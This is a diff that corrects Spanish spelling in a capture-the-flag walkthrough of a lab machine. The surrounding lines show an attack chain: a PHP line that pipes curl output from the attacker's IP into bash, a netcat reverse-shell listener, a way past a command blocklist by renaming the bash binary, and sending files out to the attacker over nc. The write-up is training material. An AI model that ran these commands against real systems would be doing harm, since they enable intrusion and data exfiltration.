@@ -1,4 +1,4 @@
-## Vuln exploit & Gaining Access {-}
+## Explotacion de vulnerabilidad & Ganando acceso {-}
 
 ### Crear una reverse shell con una pagina html {-}
 
@@ -37,7 +37,7 @@ Aqui vemos el codigo fuente del index.html creado. La idea aqui seria interpreta
     <?php system("curl 10.10.14.28 | bash"); ?>
     ```
 
-La connection se entabla pero el servidor nos expulsa directamente.
+La coneccion se entabla pero el servidor nos expulsa directamente.
 
 ### Creamos una FakeShell {-}
 
@@ -65,9 +65,9 @@ done
 
 > [ ! ] Notas: Las explicaciones del script se pueden ver en el video live en el minuto 50:19
 
-Tambien se podri utilizar la heramienta creada por s4vitar [ttyoverhttp](https://github.com/s4vitar/ttyoverhttp)
+Tambien se podria utilizar la heramienta creada por s4vitar [ttyoverhttp](https://github.com/s4vitar/ttyoverhttp)
 
-### Analyzando el servidor {-}
+### Analizando el servidor {-}
 
 ```bash
 whoami
@@ -80,9 +80,9 @@ cat /home/xalvas/user.txt
 
 Encontramos el usuario **xalvas** y ya podemos leer la flag.
 
-La pregunta aqui seria: Porque no nos deja entablar una reverse shell? Porque el systema nos expulsa cuando lo hacemos?
+La pregunta aqui seria: Porque no nos deja entablar una reverse shell? Porque el sistema nos expulsa cuando lo hacemos?
 
-El commando `ls -l /home/xalvas` nos muestra ficheros. En el fichero `intrusions` vemos lo siguiente
+El comando `ls -l /home/xalvas` nos muestra ficheros. En el fichero `intrusions` vemos lo siguiente
 
 ```bash
 cat /home/xalvas/intrusions
@@ -92,11 +92,11 @@ cat /home/xalvas/intrusions
     knitr::include_graphics("images/calamity-intrusions.png")
 ```
 
-Vemos que el commando `nc` esta BlackListeado y que loggea el Proccess Kill en este fichero. El problema de esto es que se puede
-que los commandos BlackListeados se controllan con los nombres mismo (no permite `nc, python, bash`). Pero que passa si copiamos el 
-binario bash y que le ponemos un nombre differente.
+Vemos que el comando `nc` esta BlackListeado y que logea el Proccess Kill en este fichero. El problema de esto es que se puede
+que los comandos BlackListeados se controlan con los nombres mismo (no permite `nc, python, bash`). Pero que pasa si copiamos el 
+binario bash y que le ponemos un nombre diferente.
 
-1. Nos ponemos en escucha por el puerto 443 en la maquina de attaquante
+1. Nos ponemos en escucha por el puerto 443 en la maquina de atacante
 
     ```bash
     nc -nlvp 443
@@ -126,7 +126,7 @@ export SHELL=bash
 
 stty -a
 
-stty rows <rownb> columns <colnb>
+stty rows <numero filas> columns <numero columnas>
 ```
 
 ### Creacion del autopwn en python {-}
@@ -182,7 +182,7 @@ if __name__ == '__main__':
     shell.interactive()
 ```
 
-Ya lo podemos lanzar con el commando `python3 autopwn.py`
+Ya lo podemos lanzar con el comando `python3 autopwn.py`
 
 > [ ! ] Notas las explicaciones paso a paso del autopwn se pueden ver en el video al minuto 1:06:21
 
@@ -190,9 +190,9 @@ Ya lo podemos lanzar con el commando `python3 autopwn.py`
 ### Investigamos la maquina {-}
 
 Ya hemos visto una lista de archivos en el repertorio de xalvas y uno es un fichero `.wav`. Nos lo enviamos
-a nuestra maquina de attackante.
+a nuestra maquina de atacante.
 
-1. En la maquina de attackante
+1. En la maquina de atacante
 
     ```bash
     nc -nlvp 443 > recov.wav
@@ -206,25 +206,25 @@ a nuestra maquina de attackante.
     /dev/shm/transfer 10.10.14.20 443 < recov.wav
     ```
 
-Hay otros ficheros de typo `.wav`, usando la misma technica nos lo enviamos tambien.
-Checkeamos que los ficheros no sa hayan compormetido durante el transfer con `md5sum`. Los ficheros `.wav` son ficheros
-de typo audio y se pueden escuchar con el commando `play recov.wav`
+Hay otros ficheros de tipo `.wav`, usando la misma tecnica nos lo enviamos tambien.
+Chequeamos que los ficheros no sa hayan comprometido durante la tansferencia con `md5sum`. Los ficheros `.wav` son ficheros
+de tipo audio y se pueden escuchar con el comando `play recov.wav`
 
-No os assusteis con la musiquita ;)
+No os asusteis con la musiquita ;)
 
 Escuchando los otros ficheros parece que el fichero `rick.wav` sea la misma cancion y esto es raro. Si le hacemos un `md5sum recov.wav rick.wav`,
 vemos que la cancion es la misma pero el **md5sum** no. Quiere decir que la integridad de la data de uno de estos ficheros a sido manipulada.
 
 
-### Reto de steganografia con Audoacity {-}
+### Reto de steganografia con Audacity {-}
 
-**Audacity** es una heramienta de audio que se puede installar con `apt install audacity`. Lo abrimos y cargamos los dos ficheros.
-Si nos dan 2 audios que parrecen se los mismos pero hemos visto con el **md5sum** que no son iguales, Una cosa que se puede hacer es 
+**Audacity** es una heramienta de audio que se puede instalar con `apt install audacity`. Lo abrimos y cargamos los dos ficheros.
+Si nos dan 2 audios que parecen se los mismos pero hemos visto con el **md5sum** que no son iguales, Una cosa que se puede hacer es 
 lanzar un audio de manera normal y al mismo tiempo con el segundo audio, invertir la onda del audio. Si hacemos esto y que los dos ficheros
-son ciertamente iguales, no tendriamos que escuchar nada. Lo unico, en este caso que se tendria que escuchar seria las differencias ente
+son ciertamente iguales, no tendriamos que escuchar nada. Lo unico, en este caso que se tendria que escuchar seria las diferencias ente
 los dos audios.
 
-> [ ! ] Notas para ver como invertir las ondas de un audio, podeis mirrar el video al minuto 1:31:00
+> [ ! ] Notas para ver como invertir las ondas de un audio, podeis mirar el video al minuto 1:31:00
 
 Ya tenemos una contraseña.
 
